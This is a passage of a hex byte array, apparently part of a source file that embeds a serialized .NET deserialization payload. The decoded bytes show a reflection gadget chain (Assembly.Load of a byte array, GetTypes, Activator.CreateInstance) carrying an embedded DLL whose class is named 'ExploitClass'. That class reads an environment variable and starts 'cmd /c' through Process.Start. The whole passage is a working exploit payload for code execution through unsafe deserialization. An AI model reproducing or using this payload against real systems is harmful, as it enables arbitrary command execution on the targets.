	0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C,
	0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D,
	0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39,
	0x5D, 0x2C, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x52, 0x65, 0x66, 0x6C, 0x65, 0x63,
	0x74, 0x69, 0x6F, 0x6E, 0x2E, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x2C, 0x20, 0x6D,
	0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E,
	0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72,
	0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69,
	0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37, 0x61, 0x35, 0x63,
	0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39, 0x5D, 0x5D, 0x09, 0x1A, 0x00, 0x00,
	0x00, 0x0A, 0x09, 0x2E, 0x00, 0x00, 0x00, 0x06, 0x40, 0x00, 0x00, 0x00, 0x1A, 0x53, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x2E, 0x52, 0x65, 0x66, 0x6C, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x2E, 0x41,
	0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x06, 0x41, 0x00, 0x00, 0x00, 0x04, 0x4C, 0x6F, 0x61,
	0x64, 0x0A, 0x04, 0x35, 0x00, 0x00, 0x00, 0x2F, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x52,
	0x65, 0x66, 0x6C, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x2E, 0x4D, 0x65, 0x6D, 0x62, 0x65, 0x72,
	0x49, 0x6E, 0x66, 0x6F, 0x53, 0x65, 0x72, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x61, 0x74, 0x69, 0x6F,
	0x6E, 0x48, 0x6F, 0x6C, 0x64, 0x65, 0x72, 0x06, 0x00, 0x00, 0x00, 0x04, 0x4E, 0x61, 0x6D, 0x65,
	0x0C, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x4E, 0x61, 0x6D, 0x65, 0x09, 0x43, 0x6C,
	0x61, 0x73, 0x73, 0x4E, 0x61, 0x6D, 0x65, 0x09, 0x53, 0x69, 0x67, 0x6E, 0x61, 0x74, 0x75, 0x72,
	0x65, 0x0A, 0x4D, 0x65, 0x6D, 0x62, 0x65, 0x72, 0x54, 0x79, 0x70, 0x65, 0x10, 0x47, 0x65, 0x6E,
	0x65, 0x72, 0x69, 0x63, 0x41, 0x72, 0x67, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x73, 0x01, 0x01, 0x01,
	0x01, 0x00, 0x03, 0x08, 0x0D, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x54, 0x79, 0x70, 0x65,
	0x5B, 0x5D, 0x09, 0x41, 0x00, 0x00, 0x00, 0x09, 0x2E, 0x00, 0x00, 0x00, 0x09, 0x40, 0x00, 0x00,
	0x00, 0x06, 0x44, 0x00, 0x00, 0x00, 0x27, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x52, 0x65,
	0x66, 0x6C, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x2E, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C,
	0x79, 0x20, 0x4C, 0x6F, 0x61, 0x64, 0x28, 0x42, 0x79, 0x74, 0x65, 0x5B, 0x5D, 0x29, 0x08, 0x00,
	0x00, 0x00, 0x0A, 0x01, 0x36, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x06, 0x45, 0x00, 0x00,
	0x00, 0xCC, 0x02, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x46, 0x75, 0x6E, 0x63, 0x60, 0x32,
	0x5B, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x52, 0x65, 0x66, 0x6C, 0x65, 0x63, 0x74,
	0x69, 0x6F, 0x6E, 0x2E, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x2C, 0x20, 0x6D, 0x73,
	0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D,
	0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65,
	0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63,
	0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35,
	0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39, 0x5D, 0x2C, 0x5B, 0x53, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x2E, 0x43, 0x6F, 0x6C, 0x6C, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x2E, 0x47,
	0x65, 0x6E, 0x65, 0x72, 0x69, 0x63, 0x2E, 0x49, 0x45, 0x6E, 0x75, 0x6D, 0x65, 0x72, 0x61, 0x62,
	0x6C, 0x65, 0x60, 0x31, 0x5B, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x54, 0x79, 0x70,
	0x65, 0x2C, 0x20, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56, 0x65, 0x72,
	0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75,
	0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50,
	0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37,
	0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39, 0x5D, 0x5D,
	0x2C, 0x20, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73,
	0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C,
	0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75,
	0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37,
	0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39, 0x5D, 0x5D, 0x09,
	0x1A, 0x00, 0x00, 0x00, 0x0A, 0x09, 0x2E, 0x00, 0x00, 0x00, 0x09, 0x40, 0x00, 0x00, 0x00, 0x06,
	0x49, 0x00, 0x00, 0x00, 0x08, 0x47, 0x65, 0x74, 0x54, 0x79, 0x70, 0x65, 0x73, 0x0A, 0x01, 0x37,
	0x00, 0x00, 0x00, 0x35, 0x00, 0x00, 0x00, 0x09, 0x49, 0x00, 0x00, 0x00, 0x09, 0x2E, 0x00, 0x00,
	0x00, 0x09, 0x40, 0x00, 0x00, 0x00, 0x06, 0x4C, 0x00, 0x00, 0x00, 0x18, 0x53, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x2E, 0x54, 0x79, 0x70, 0x65, 0x5B, 0x5D, 0x20, 0x47, 0x65, 0x74, 0x54, 0x79, 0x70,
	0x65, 0x73, 0x28, 0x29, 0x08, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x38, 0x00, 0x00, 0x00, 0x34, 0x00,
	0x00, 0x00, 0x06, 0x4D, 0x00, 0x00, 0x00, 0xC6, 0x01, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E,
	0x46, 0x75, 0x6E, 0x63, 0x60, 0x32, 0x5B, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x54,
	0x79, 0x70, 0x65, 0x2C, 0x20, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56,
	0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20,
	0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C,
	0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D,
	0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39,
	0x5D, 0x2C, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74,
	0x2C, 0x20, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73,
	0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C,
	0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75,
	0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37,
	0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65, 0x30, 0x38, 0x39, 0x5D, 0x5D, 0x09,
	0x1A, 0x00, 0x00, 0x00, 0x0A, 0x09, 0x2E, 0x00, 0x00, 0x00, 0x06, 0x50, 0x00, 0x00, 0x00, 0x10,
	0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x41, 0x63, 0x74, 0x69, 0x76, 0x61, 0x74, 0x6F, 0x72,
	0x06, 0x51, 0x00, 0x00, 0x00, 0x0E, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x49, 0x6E, 0x73, 0x74,
	0x61, 0x6E, 0x63, 0x65, 0x0A, 0x01, 0x39, 0x00, 0x00, 0x00, 0x35, 0x00, 0x00, 0x00, 0x09, 0x51,
	0x00, 0x00, 0x00, 0x09, 0x2E, 0x00, 0x00, 0x00, 0x09, 0x50, 0x00, 0x00, 0x00, 0x06, 0x54, 0x00,
	0x00, 0x00, 0x29, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74,
	0x20, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x28,
	0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x54, 0x79, 0x70, 0x65, 0x29, 0x08, 0x00, 0x00, 0x00,
	0x0A, 0x01, 0x3A, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x06, 0x55, 0x00, 0x00, 0x00, 0x26,
	0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74,
	0x4D, 0x6F, 0x64, 0x65, 0x6C, 0x2E, 0x44, 0x65, 0x73, 0x69, 0x67, 0x6E, 0x2E, 0x43, 0x6F, 0x6D,
	0x6D, 0x61, 0x6E, 0x64, 0x49, 0x44, 0x04, 0x00, 0x00, 0x00, 0x09, 0x2A, 0x00, 0x00, 0x00, 0x10,
	0x3B, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x09, 0x57, 0x00, 0x00, 0x00, 0x08, 0x08, 0x00,
	0x20, 0x00, 0x00, 0x0F, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x02, 0x4D, 0x5A, 0x90,
	0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA,
	0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20,
	0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x62,
	0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64,
	0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00,
	0x00, 0x4C, 0x01, 0x03, 0x00, 0x90, 0x63, 0x6B, 0x62, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0xE0, 0x00, 0x02, 0x21, 0x0B, 0x01, 0x08, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x06, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0xAE, 0x23, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x40, 0x00,
	0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x04, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00,
	0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x40, 0x85, 0x00, 0x00, 0x10,
	0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x23, 0x00,
	0x00, 0x4B, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xA8, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00,
	0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x20, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0xB4, 0x03, 0x00,
	0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60, 0x2E, 0x72, 0x73,
	0x72, 0x63, 0x00, 0x00, 0x00, 0xA8, 0x02, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x04, 0x00,
	0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x40, 0x00, 0x00, 0x40, 0x2E, 0x72, 0x65, 0x6C, 0x6F, 0x63, 0x00, 0x00, 0x0C, 0x00, 0x00,
	0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x23, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x02, 0x00, 0x05, 0x00, 0x78, 0x20, 0x00,
	0x00, 0xE8, 0x02, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9A, 0x02, 0x28,
	0x03, 0x00, 0x00, 0x0A, 0x72, 0x01, 0x00, 0x00, 0x70, 0x72, 0x09, 0x00, 0x00, 0x70, 0x72, 0x11,
	0x00, 0x00, 0x70, 0x28, 0x04, 0x00, 0x00, 0x0A, 0x28, 0x05, 0x00, 0x00, 0x0A, 0x28, 0x06, 0x00,
	0x00, 0x0A, 0x26, 0x2A, 0x00, 0x42, 0x53, 0x4A, 0x42, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x0C, 0x00, 0x00, 0x00, 0x76, 0x32, 0x2E, 0x30, 0x2E, 0x35, 0x30, 0x37, 0x32, 0x37, 0x00,
	0x00, 0x00, 0x00, 0x05, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x23, 0x7E, 0x00,
	0x00, 0x6C, 0x01, 0x00, 0x00, 0xFC, 0x00, 0x00, 0x00, 0x23, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67,
	0x73, 0x00, 0x00, 0x00, 0x00, 0x68, 0x02, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x23, 0x55, 0x53,
	0x00, 0x88, 0x02, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x23, 0x47, 0x55, 0x49, 0x44, 0x00, 0x00,
	0x00, 0x98, 0x02, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x23, 0x42, 0x6C, 0x6F, 0x62, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x01, 0x47, 0x14, 0x00, 0x00, 0x09, 0x00, 0x00,
	0x00, 0x00, 0xFA, 0x01, 0x33, 0x00, 0x16, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00,
	0x00, 0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x06, 0x00, 0x34, 0x00, 0x2D, 0x00, 0x06, 0x00, 0x61, 0x00, 0x41, 0x00, 0x06,
	0x00, 0x81, 0x00, 0x41, 0x00, 0x06, 0x00, 0xA8, 0x00, 0x2D, 0x00, 0x06, 0x00, 0xCB, 0x00, 0x2D,
	0x00, 0x0A, 0x00, 0xEC, 0x00, 0xD9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x10, 0x00, 0x17, 0x00, 0x00, 0x00, 0x05, 0x00, 0x01,
	0x00, 0x01, 0x00, 0x50, 0x20, 0x00, 0x00, 0x00, 0x00, 0x86, 0x18, 0x3B, 0x00, 0x0A, 0x00, 0x01,
	0x00, 0x11, 0x00, 0x3B, 0x00, 0x0E, 0x00, 0x19, 0x00, 0x3B, 0x00, 0x0A, 0x00, 0x09, 0x00, 0x3B,
	0x00, 0x0A, 0x00, 0x21, 0x00, 0xB4, 0x00, 0x13, 0x00, 0x29, 0x00, 0xD2, 0x00, 0x18, 0x00, 0x31,
	0x00, 0xF4, 0x00, 0x1E, 0x00, 0x2E, 0x00, 0x0B, 0x00, 0x25, 0x00, 0x2E, 0x00, 0x13, 0x00, 0x2E,
	0x00, 0x04, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x9F, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x01, 0x00, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x3C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x3E, 0x00, 0x63, 0x7A, 0x6A, 0x66, 0x77,
	0x71, 0x67, 0x6E, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x45, 0x78, 0x70, 0x6C, 0x6F, 0x69, 0x74, 0x43,
	0x6C, 0x61, 0x73, 0x73, 0x00, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x00, 0x53, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x00, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0x2E, 0x63, 0x74, 0x6F,
	0x72, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x52, 0x75, 0x6E, 0x74, 0x69, 0x6D, 0x65,
	0x2E, 0x43, 0x6F, 0x6D, 0x70, 0x69, 0x6C, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65,
	0x73, 0x00, 0x43, 0x6F, 0x6D, 0x70, 0x69, 0x6C, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x52, 0x65, 0x6C,
	0x61, 0x78, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74,
	0x65, 0x00, 0x52, 0x75, 0x6E, 0x74, 0x69, 0x6D, 0x65, 0x43, 0x6F, 0x6D, 0x70, 0x61, 0x74, 0x69,
	0x62, 0x69, 0x6C, 0x69, 0x74, 0x79, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00,
	0x63, 0x7A, 0x6A, 0x66, 0x77, 0x71, 0x67, 0x6E, 0x00, 0x45, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E,
	0x6D, 0x65, 0x6E, 0x74, 0x00, 0x47, 0x65, 0x74, 0x45, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E, 0x6D,
	0x65, 0x6E, 0x74, 0x56, 0x61, 0x72, 0x69, 0x61, 0x62, 0x6C, 0x65, 0x00, 0x53, 0x74, 0x72, 0x69,
	0x6E, 0x67, 0x00, 0x43, 0x6F, 0x6E, 0x63, 0x61, 0x74, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x2E, 0x44, 0x69, 0x61, 0x67, 0x6E, 0x6F, 0x73, 0x74, 0x69, 0x63, 0x73, 0x00, 0x50, 0x72, 0x6F,
	0x63, 0x65, 0x73, 0x73, 0x00, 0x53, 0x74, 0x61, 0x72, 0x74, 0x00, 0x00, 0x00, 0x00, 0x07, 0x63,
	0x00, 0x6D, 0x00, 0x64, 0x00, 0x00, 0x07, 0x2F, 0x00, 0x63, 0x00, 0x20, 0x00, 0x00, 0x0B, 0x70,
	0x00, 0x65, 0x00, 0x33, 0x00, 0x38, 0x00, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x1C, 0xF4,
	0xD2, 0x02, 0xB7, 0x76, 0x4A, 0x95, 0x59, 0x4A, 0x4F, 0x99, 0x6A, 0xDE, 0x64, 0x00, 0x08, 0xB7,
	0x7A, 0x5C, 0x56, 0x19, 0x34, 0xE0, 0x89, 0x03, 0x20, 0x00, 0x01, 0x04, 0x20, 0x01, 0x01, 0x08,
	0x04, 0x00, 0x01, 0x0E, 0x0E, 0x05, 0x00, 0x02, 0x0E, 0x0E, 0x0E, 0x06, 0x00, 0x02, 0x12, 0x19,
	0x0E, 0x0E, 0x08, 0x01, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1E, 0x01, 0x00, 0x01, 0x00,
	0x54, 0x02, 0x16, 0x57, 0x72, 0x61, 0x70, 0x4E, 0x6F, 0x6E, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74,
	0x69, 0x6F, 0x6E, 0x54, 0x68, 0x72, 0x6F, 0x77, 0x73, 0x01, 0x00, 0x00, 0x00, 0x88, 0x23, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9E, 0x23, 0x00, 0x00, 0x00, 0x20, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5F,
	0x43, 0x6F, 0x72, 0x44, 0x6C, 0x6C, 0x4D, 0x61, 0x69, 0x6E, 0x00, 0x6D, 0x73, 0x63, 0x6F, 0x72,
	0x65, 0x65, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x25, 0x00, 0x20, 0x40,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x10, 0x00, 0x00,
